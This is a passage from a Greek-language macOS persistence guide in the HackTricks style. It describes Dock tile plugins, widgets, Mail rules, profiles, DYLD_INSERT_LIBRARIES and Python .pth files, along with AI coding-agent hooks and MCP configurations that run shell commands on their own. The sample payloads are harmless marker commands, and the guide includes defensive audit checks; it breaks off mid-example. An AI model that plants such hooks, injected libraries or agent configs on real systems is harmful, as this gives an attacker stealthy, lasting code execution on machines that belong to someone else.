Αυτή η δοκιμή αντιγραφής παρήγαγε `marker fired: True` στο macOS 26.5.2· ο αρχικός launcher δεν τροποποιήθηκε. Αποδεικνύει ότι το σημείο εισαγωγής εκτελείται στο αντίγραφο, όχι ότι μια τροποποιημένη υπογεγραμμένη δέσμη εφαρμογής ή μια πραγματική εγκατάσταση Homebrew θα περνούσε όλους τους ελέγχους εκκίνησης.

### Dock Tile Plugins

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Απαιτείται μια εφαρμογή που δηλώνει το plug-in, ώστε αυτό να εντοπιστεί/καταχωριστεί και να υποβληθεί σε επεξεργασία από το Dock
  - Το plugin φορτώνεται σε έναν **Apple-signed** βοηθητικό μηχανισμό που δεν έχει entitlement app-sandbox και έχει απενεργοποιημένο το **library validation**. Στην έρευνα που αναφέρεται, αυτός ο βοηθητικός μηχανισμός δεν εμφανιζόταν στο περιβάλλον εργασίας Background Task Management· η ορατότητά του σε μια στοχευμένη έκδοση θα πρέπει να ελεγχθεί.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, αναφέρεται με το κλειδί **`NSDockTilePlugIn`** στο `Info.plist` της εφαρμογής· το `Info.plist` του ίδιου του plugin ορίζει το **`NSPrincipalClass`**.

#### Περιγραφή & Exploitation

Όταν μια εφαρμογή δηλώνει `NSDockTilePlugIn`, το Dock μπορεί να φορτώσει τη δέσμη που αναφέρεται στον βοηθητικό μηχανισμό XPC **`com.apple.dock.external.extra`** (`...extra.arm64` σε Apple Silicon) κατά τη σύνδεση ή όταν προστεθεί το tile της· δεν χρειάζεται να εκκινηθεί η ίδια η εφαρμογή. Αυτό απαιτεί η εφαρμογή να εντοπιστεί/καταχωριστεί και να γίνει αποδεκτή από το macOS. Ο βοηθητικός μηχανισμός είναι **Apple-signed**, δεν έχει entitlement `com.apple.security.app-sandbox` και διαθέτει το `com.apple.security.cs.disable-library-validation`. Κατά τη φόρτωση καλείται η μέθοδος **`setDockTile:`** της principal class· από εκεί μπορεί να εγγραφεί σε κατανεμημένες ειδοποιήσεις (π.χ. `com.apple.screenIsLocked`) για μεταγενέστερα συμβάντα.<sup>[[38]](#references)</sup>

Στο macOS 26.5.2, η επιθεώρηση `codesign` μόνο για ανάγνωση επιβεβαίωσε την υπογραφή Apple και τα entitlements του βοηθητικού μηχανισμού, ενώ αρκετές εγκατεστημένες εφαρμογές δήλωναν `NSDockTilePlugIn`. Δεν εγκαταστάθηκε ούτε φορτώθηκε νέο plug-in σε εκείνο το Mac, επομένως η εκτέλεση μιας νεογραμμένης δέσμης σε αυτή την έκδοση παραμένει ανεπιβεβαίωτη.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Το widget extension εκτελείται στη **δική του διεργασία**, και η προσθήκη του **δεν** εμφανίζει ειδοποίηση Background Task Management
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Το config plist βρίσκεται μέσα σε ένα container που προστατεύεται από TCC, οπότε η επεξεργασία του από έξω απαιτεί Full Disk Access ή παράκαμψη TCC

#### Τοποθεσία

- Bundle του widget extension: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Ενεργά/καταχωρισμένα widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (κλειδιά `widgets.instances` και `widgets.widgets`)

#### Περιγραφή και εκμετάλλευση

Ένα WidgetKit extension που περιλαμβάνεται σε μια εφαρμογή εκτελείται στη **δική του διεργασία**, υπό τη διαχείριση του Notification Center. Η καταχώριση μιας instance στο `widgets.instances` (ένα blob `CHSWidget` κωδικοποιημένο με base64 `NSKeyedArchiver`, που περιέχει ενσωματωμένα δεδομένα `INIntent`) και η επανεκκίνηση του NotificationCenter κάνουν το widget να φορτωθεί και να εκτελέσει τον κώδικα `TimelineProvider`/intent του.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Κανόνες Mail.app (Εκτέλεση AppleScript)

Ανάλυση: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, το Mail.app πρέπει να έχει ρυθμιστεί με λογαριασμό και να εκτελείται· το trigger είναι ένα εισερχόμενο email
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Η επεξεργασία των κανόνων/scripts εκτός του Mail ενδέχεται να απαιτεί το Mail να είναι κλειστό και να έχει δοθεί Full Disk Access σε σύγχρονες εκδόσεις του macOS

#### Τοποθεσία

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (τοπικοί κανόνες· `V10` στα Sonoma/Sequoia, `V11`+ σε νεότερες εκδόσεις)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (κανόνες συγχρονισμένοι μέσω iCloud, έχουν προτεραιότητα)
- Ενεργοποίηση κανόνων: **`RulesActiveState.plist`**· AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Περιγραφή & Exploitation

Ένας **κανόνας** του Apple Mail μπορεί να περιλαμβάνει μια ενέργεια *"Run AppleScript"*. Προσθέτοντας έναν κανόνα που αντιστοιχεί σε μια ειδικά διαμορφωμένη **γραμμή θέματος** και εκτελεί ένα script του επιτιθέμενου, ο αντίπαλος αποκτά **απομακρυσμένη, stealthy** εκτέλεση κώδικα στο πλαίσιο του Mail κάθε φορά που φτάνει το ειδικά διαμορφωμένο email — ένας φορέας που παρακάμπτει πολλούς σαρωτές persistence, καθώς δεν δημιουργείται κανένα LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Αν ρυθμιστεί ο κανόνας ώστε να **διαγράφει** και το email-trigger, τα ίχνη αποκρύπτονται. Οι αμυνόμενοι μπορούν να το αναζητήσουν απευθείας:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Προφίλ διαμόρφωσης (.mobileconfig)

Ανάλυση: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - Οι σύγχρονες εκδόσεις του macOS απαιτούν **χειροκίνητη έγκριση από τον χρήστη** στις Ρυθμίσεις συστήματος → *Διαχείριση συσκευών* (η σιωπηλή εγκατάσταση μέσω `profiles install` δεν είναι πλέον διαθέσιμη εκτός MDM)
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Τα εγκατεστημένα προφίλ βρίσκονται στα **`/Library/Managed Preferences/`** και **`/var/db/ConfigurationProfiles/`**· ένα προφίλ είναι ένα XML plist με έναν πίνακα `PayloadContent`.

#### Περιγραφή και εκμετάλλευση

Ένα `.mobileconfig` δεν αποτελεί από μόνο του πρωτογενή μηχανισμό εκτέλεσης κώδικα, αλλά μπορεί να διατηρεί ρυθμίσεις, όπως μια **έμπιστη ριζική CA** (`com.apple.security.root`), έναν **καθολικό proxy ή PAC** (`com.apple.proxy.*`), **διαχειριζόμενες προτιμήσεις** (`com.apple.ManagedClient.preferences`) ή περιορισμούς. Στο macOS 10.15 και νεότερες εκδόσεις, ο ορισμός της Apple για το [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) αναφέρει ότι, αν οριστεί σε `true` σε ένα **χειροκίνητα εγκατεστημένο** προφίλ χωρίς payload κωδικού πρόσβασης για την αφαίρεση, απαιτείται **έλεγχος ταυτότητας διαχειριστή** για την αφαίρεσή του· αυτό δεν καθιστά το προφίλ απολύτως μη αφαιρέσιμο. Τα προφίλ που εγκαθίστανται μέσω MDM υπόκεινται σε ξεχωριστούς κανόνες διαχείρισης και αφαίρεσης.<sup>[[44]](#references)</sup>

> [!WARNING]
> Ένα απλό προφίλ διαμόρφωσης **δεν διαθέτει τύπο payload που να εγκαθιστά αυθαίρετο `LaunchDaemon`/`LaunchAgent`**. Για την εγκατάσταση daemon με αυτόν τον τρόπο απαιτούνται πλήρης **εγγραφή σε MDM** και agent/script διαχείρισης — μην αντιμετωπίζετε το `.mobileconfig` ως μηχανισμό παράδοσης για το launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence μέσω DYLD_INSERT_LIBRARIES

- Χρήσιμο για παράκαμψη του sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - Το dyld **αφαιρεί** τις μεταβλητές `DYLD_*` για δυαδικά αρχεία SIP/platform, εφαρμογές με hardened runtime και στόχους setuid, επομένως κάνει inject μόνο σε μη προστατευμένες διεργασίες και **δεν** παρακάμπτει το SIP ή το hardened runtime
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Αξιόπιστη μορφή: το λεξικό **`EnvironmentVariables`** μέσα σε κακόβουλο plist `LaunchAgent`/`LaunchDaemon` (εκτελείται κατά τη σύνδεση/εκκίνηση)
- Παρωχημένα/ιστορικά (μόνο για αναφορά): **`~/.MacOSX/environment.plist`** (καταργήθηκε στην 10.8) και **`/etc/launchd.conf`** (καταργήθηκε στην 10.10)

#### Περιγραφή & Exploitation

Αν ένας εισβολέας καταφέρει να εισαγάγει το `DYLD_INSERT_LIBRARIES` στο περιβάλλον μιας διεργασίας του θύματος, το dyld φορτώνει το dylib του εισβολέα (εκτελείται ο constructor του) σε αυτή τη διεργασία. Η μόνιμη παραλλαγή ενσωματώνει τη μεταβλητή σε ένα LaunchAgent, ώστε κάθε εκκίνηση της εργασίας να κάνει ξανά inject. Σημειώστε ότι το `launchctl setenv DYLD_*` φιλτράρεται σε σύγχρονες εκδόσεις του macOS, οπότε ενσωματώστε το αντί γι’ αυτό στο plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Για τους πλήρεις μηχανισμούς του dylib injection/hijacking, δείτε:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI AI Coding Agent (hooks, MCP servers, αρχεία κανόνων)

Αναλύσεις: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor σε αρχείο κανόνων (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Απαιτεί από τον developer να χρησιμοποιεί τον σχετικό agent. Οι εντολές εκκίνησης εκτελούνται με τα δικαιώματα του χρήστη όταν ο agent αποδέχεται τη διαμόρφωσή του· η εμπιστοσύνη στον χώρο εργασίας και η έγκριση MCP διαφέρουν ανά προϊόν και λειτουργία συνεδρίας.
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle) (εκτελείται ως ο χρήστης· κληρονομεί όσα δικαιώματα έχει ήδη το terminal/agent)

#### Τοποθεσία

Τα ρητά αρχεία διαμόρφωσης hook και MCP μπορούν να προκαλέσουν την **εκτέλεση εντολών shell ή child processes όταν ο developer χρησιμοποιεί το εργαλείο** — είτε μέσω ενός καθολικού αρχείου ανά χρήστη (persistence) είτε μέσω ενός αρχείου που έχει γίνει commit σε ένα repo (supply-chain). Τα `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` και οι κανόνες του editor είναι **οδηγίες προς έναν agent**, όχι εγγυημένη εκτέλεση shell κατά την ανάγνωση· η επίδρασή τους εξαρτάται από τη συμπεριφορά του agent και τα δικαιώματα των εργαλείων. Ελέγξτε τους τρέχοντες κανόνες εμπιστοσύνης και έγκρισης κάθε προϊόντος.

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json` και το αρχείο **`/Library/Application Support/ClaudeCode/managed-settings.json`**, το οποίο είναι διαθέσιμο μόνο για root (ρυθμίσεις MDM/managed **δεν μπορούν να παρακαμφθούν** από τον χρήστη → ισχυρό persistence)
  - Αντικείμενο `hooks` — συμβάντα `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — το καθένα εκτελεί μια εντολή shell `command`
  - `statusLine.command` — εντολή shell που εκτελείται για την εμφάνιση της γραμμής κατάστασης (σε κάθε συνεδρία)
  - MCP servers στο `~/.claude.json` / project `.mcp.json` — τα `command`+`args` εκκινούνται ως child processes
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — οδηγίες που μπορούν να επιχειρήσουν prompt injection, ανάλογα με τη συμπεριφορά του agent και τα δικαιώματα των εργαλείων
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` εκκινούνται ως child processes)· οδηγίες project στο `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers)· `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … εκτελούν εντολές)· `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`· GitHub Copilot `.github/copilot-instructions.md`

#### Περιγραφή και Exploitation

Αν ένας actor μπορεί να τροποποιήσει τις καθολικές ρυθμίσεις χρήστη του λογαριασμού, οι εντολές hook ή MCP μπορούν να εκτελεστούν σε μελλοντικές συνεδρίες υπό αυτόν τον λογαριασμό. Η διαμόρφωση που ελέγχεται από ένα repository είναι ξεχωριστή περίπτωση: η [τρέχουσα τεκμηρίωση ασφαλείας του Claude Code](https://code.claude.com/docs/en/security) περιγράφει ένα διαδραστικό παράθυρο διαλόγου εμπιστοσύνης για τον χώρο εργασίας και ένα ξεχωριστό αίτημα έγκρισης για τους servers του project `.mcp.json`. Ο [πίνακας δικαιωμάτων του](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) αναφέρει ότι τα hooks μπορούν να εκτελεστούν αφού έχει δοθεί εμπιστοσύνη σε έναν γονικό φάκελο, ενώ οι συνεδρίες `claude -p`/SDK δεν εμφανίζουν το διαδραστικό αίτημα εμπιστοσύνης· σε αυτές τις μη διαδραστικές λειτουργίες, οι MCP servers του project συνδέονται χωρίς αίτημα έγκρισης. Η παράκαμψη του hook project πριν από την εμπιστοσύνη, η οποία αναφέρθηκε ως CVE-2025-59536, [διορθώθηκε το 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)· μην τη θεωρείτε τρέχουσα προεπιλεγμένη συμπεριφορά. Οι φορείς παράδοσης μπορεί να περιλαμβάνουν ένα παραβιασμένο repository ή ένα κακόβουλο πρόγραμμα εγκατάστασης. Το prompt injection μέσω αρχείων κανόνων είναι λιγότερο προβλέψιμο από ένα ρητό hook και εξακολουθεί να εξαρτάται από τις εγκρίσεις των εργαλείων.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Παράδειγμα καθολικών ρυθμίσεων χρήστη του Claude Code· τοποθετήστε το μόνο σε προσωρινό λογαριασμό κατά τη δοκιμή:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Παράδειγμα καθολικής διαμόρφωσης Codex MCP για τον χρήστη:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Παράδειγμα διαμόρφωσης hook του Cursor· ελέγξτε το schema της εγκατεστημένης έκδοσής του πριν το χρησιμοποιήσετε:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Επεκτάσεις προγράμματος περιήγησης (Chromium: Chrome / Brave / Edge)

Αναφορά: [Εξωτερικές επεκτάσεις Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Κατάχρηση του ExtensionInstallForcelist στο macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Απαιτεί υποστηριζόμενο πρόγραμμα περιήγησης και εγκατεστημένη, ενεργοποιημένη επέκταση. Οι External Extensions στο macOS απαιτούν επιβεβαίωση από τον χρήστη· η διαχειριζόμενη force-install απαιτεί κατάλληλη εταιρική πολιτική.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Αυτό διαφέρει από τα **native messaging hosts** (βλ. την ενότητα *Chrome native messaging hosts* παραπάνω). Εδώ, η persistence είναι η ίδια η **αυτόματα εγκατεστημένη επέκταση**.

#### Τοποθεσία

- **JSON External Extensions** (εντοπίζεται κατά την εκκίνηση του προγράμματος περιήγησης και, στη συνέχεια, απαιτείται prompt ενεργοποίησης στο macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (ανά χρήστη) ή `/Library/Application Support/Google/Chrome/External Extensions/` (όλοι οι χρήστες)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Force-install μέσω εταιρικής πολιτικής** με managed preferences / configuration profile:
  - κλειδί `ExtensionInstallForcelist` του `com.google.Chrome` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), αναγιγνώσκεται από το `/Library/Managed Preferences/` ή από εγκατεστημένο `.mobileconfig`

#### Περιγραφή & Εκμετάλλευση

Πρόκειται για δύο διαφορετικές διαδρομές εγκατάστασης. Η [τεκμηρίωση external-install του Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) αναφέρει ότι οι χρήστες Windows και macOS πρέπει να επιβεβαιώσουν και να ενεργοποιήσουν μια επέκταση που προσφέρεται μέσω αρχείου *External Extensions*· η επέκταση δεν εκτελείται απλώς και μόνο επειδή γράφτηκε αυτό το αρχείο JSON. Για εγκατάσταση σε όλους τους χρήστες στο macOS, το Chrome απαιτεί επίσης το αρχείο external-extension να προστατεύεται από τροποποιήσεις από μη προνομιούχους χρήστες. Μια διαχειριζόμενη πολιτική `ExtensionInstallForcelist` ή `ExtensionSettings` μπορεί να εγκαταστήσει και να καρφιτσώσει μια επέκταση χωρίς αλληλεπίδραση του χρήστη· ο [οδηγός πολιτικών της Google για Mac](https://support.google.com/chrome/a/answer/7517624) περιγράφει τη διαχειριζόμενη ρύθμιση και αναφέρει ότι οι επεκτάσεις που εγκαθίστανται με force-install δεν μπορούν να αφαιρεθούν από τον χρήστη. Πρόκειται για διαδρομή ανάπτυξης πολιτικής και όχι για συντόμευση `defaults write` ανά χρήστη.<sup>[[49]](#references)</sup>

> [!WARNING]
> Στο macOS, ένα JSON manifest *External Extensions* πρέπει να δείχνει σε URL ενημέρωσης του **Chrome Web Store**, όχι σε τοπικό CRX. Η ανάπτυξη μέσω διαχειριζόμενης πολιτικής έχει τις δικές της εταιρικές προϋποθέσεις και μπορεί να επιτρέπει διαχειριζόμενο URL ενημέρωσης self-hosted. Για τοπική unpacked επέκταση σε δοκιμαστικό προφίλ, ο διακόπτης `--load-extension=/path` της λειτουργίας προγραμματιστή του Chrome είναι ξεχωριστός μηχανισμός και δεν καθιστά ένα αρχείο JSON External Extensions αυτοεκτελούμενο. Μην θεωρείτε ότι η εγγραφή στο `Secure Preferences` ισοδυναμεί με κάποια από τις δύο τεκμηριωμένες μεθόδους καταχώρισης.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Εκκινήστε το Chrome σε αυτόν τον προσωρινό λογαριασμό και παρατηρήστε το prompt ενεργοποίησης· η ίδια η συμπεριφορά του extension αποτελεί το PoC εκτέλεσης μόλις το αποδεχτεί ο χρήστης. Μετά τη δοκιμή, αφαιρέστε το manifest και απενεργοποιήστε ή απεγκαταστήστε το extension από αυτό το profile. Αυτή η διαδρομή **δεν** δοκιμάστηκε στο ενεργό profile του Chrome στον Mac της έρευνας. Ούτε και η διαδρομή μέσω managed policy εφαρμόστηκε εκεί.

Τα Force-install και External Extensions αναφέρονται σε extension IDs του **Chrome Web Store**· για το τέχνασμα χαμηλότερου επιπέδου της αθόρυβης εισαγωγής ενός τοπικού extension μέσω επεξεργασίας των HMAC-signed `Secure Preferences` του profile, καθώς και για άλλες καταχρήσεις διεργασιών Chromium, δείτε:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Χειριστές URL Scheme και τύπων αρχείων (LaunchServices)

Ανάλυση: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Το έναυσμα είναι να κάνει το θύμα κλικ σε έναν σύνδεσμο (π.χ. στο Chrome/Brave/Safari) ή να ανοίξει ένα αρχείο του καταχωρισμένου τύπου
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Ένα app bundle που δηλώνει στο `Info.plist` τα **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) ή τα **`CFBundleDocumentTypes`** (επέκταση αρχείου/UTI)
- Οι προεπιλεγμένες ρυθμίσεις που ισχύουν για κάθε χρήστη μπορεί να εμφανίζονται στο **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (πίνακας `LSHandlers`). Το υποστηριζόμενο API της Apple για την επιλογή προεπιλεγμένου χειριστή URL scheme είναι το `LSSetDefaultHandlerForURLScheme`· η απευθείας εγγραφή σε αυτό το plist δεν αποτελεί τεκμηριωμένο τρόπο καταχώρισης ή ενημέρωσης της cache.

#### Περιγραφή και εκμετάλλευση

Το Launch Services αντλεί τις δηλώσεις URL scheme και εγγράφων από το `Info.plist` μιας καταχωρισμένης εφαρμογής. Ο [οδηγός καταχώρισης της Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) αναφέρει ότι η καταχώριση μπορεί να γίνει όταν το Finder εντοπίσει την εφαρμογή, κατά την εκκίνηση ή τη σύνδεση χρήστη, ή μέσω ρητής κλήσης API καταχώρισης· η απλή τοποθέτηση μιας εφαρμογής κάπου δεν εγγυάται ότι θα ενεργοποιηθεί αμέσως η διαδικασία. Μετά την καταχώριση, το άνοιγμα ενός URL ή εγγράφου που αντιστοιχεί μπορεί να εκκινήσει την επιλεγμένη εφαρμογή χειριστή, με την επιφύλαξη της επιλογής προεπιλεγμένου χειριστή του χρήστη και των συνήθων ελέγχων εκκίνησης του macOS. Το υποστηριζόμενο API `LSSetDefaultHandlerForURLScheme` αλλάζει τον προτιμώμενο από τον χρήστη χειριστή URL· δεν προκαλεί την αυτόματη εκτέλεση μιας εφαρμογής που μόλις προστέθηκε.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Δεν καταχωρίστηκε καμία εφαρμογή και δεν άλλαξε καμία προτίμηση handler στον Mac έρευνας με macOS 26.5.2. Για να δοκιμάσετε έναν πραγματικό handler, χρησιμοποιήστε έναν προσωρινό λογαριασμό χρήστη, καταχωρίστε μια εφαρμογή που κάνει μόνο marker με ένα μοναδικό scheme, καλέστε το URL της και, στη συνέχεια, αφαιρέστε την εφαρμογή και την καταχώρισή της.

Για αναλυτικές πληροφορίες σχετικά με την απαρίθμηση/κατάχρηση των handlers επεκτάσεων αρχείων και URL schemes, δείτε:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Αρχεία εκκίνησης Python (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Εκτελείται κατά την εκκίνηση του σχετικού interpreter Python, όταν είναι ενεργοποιημένος αυτός ο κατάλογος site· το trigger δεν είναι καθολικό σε όλα τα virtual environments, builds Python ή flags εκκίνησης
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Εκτελείται με τα δικαιώματα/TCC της διεργασίας που εκκίνησε τον interpreter

#### Τοποθεσία

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Δεν απαιτείται root (εγγράψιμο από τον χρήστη)
  - **Trigger**: εκκίνηση αυτού του build Python με ενεργοποιημένο το user site· το module `site` επεξεργάζεται τα αρχεία `.pth` στους ενεργούς καταλόγους site
- **`<user-site>/usercustomize.py`**
  - Δεν απαιτείται root
  - **Trigger**: εκκίνηση με ενεργοποιημένο το user site (γίνεται αυτόματη εισαγωγή από το `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (π.χ. `/opt/homebrew/lib/python3.13/site-packages/`, ή διαδρομές συστήματος)
  - Ενδέχεται να απαιτούνται δικαιώματα root/admin, ανάλογα με τη θέση του interpreter
  - **Trigger**: εκκίνηση interpreter που περιλαμβάνει αυτόν τον κατάλογο site

#### Περιγραφή & Exploitation

Κατά την εκκίνηση, η Python συνήθως εισάγει το `site` και σαρώνει τους ενεργούς καταλόγους `site-packages` για αρχεία `.pth`. Εκτός από την προσθήκη διαδρομών, μια γραμμή `.pth` που αρχίζει με `import ` εκτελεί κώδικα Python, ακόμη κι αν το κατονομαζόμενο module δεν χρησιμοποιηθεί με άλλον τρόπο. Η Python επιχειρεί επίσης να εισαγάγει τα `sitecustomize` και, **όταν είναι ενεργοποιημένο το user site**, το `usercustomize`.<sup>[[56]](#references)</sup> Το trigger είναι η επόμενη εκκίνηση ενός interpreter που εντοπίζει τον τροποποιημένο κατάλογο. Το `-S` απενεργοποιεί την επεξεργασία του `site`· τα `-s`, `-I` ή `PYTHONNOUSERSITE` απενεργοποιούν τις παραλλαγές **user-site**. Το `-I` γενικά δεν απενεργοποιεί ένα καθολικό `sitecustomize`. Τα virtual environments ενδέχεται επίσης να αποκλείουν το user site. Ελέγξτε το `python3 -m site` για τον συγκεκριμένο interpreter.

Το ακόλουθο PoC εκτελέστηκε σε macOS 26.5.2. Το `PYTHONUSERBASE` μεταφέρει το user site σε έναν προσωρινό κατάλογο για αυτήν τη δοκιμή· δεν τροποποιείται κανένα πραγματικό user site:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
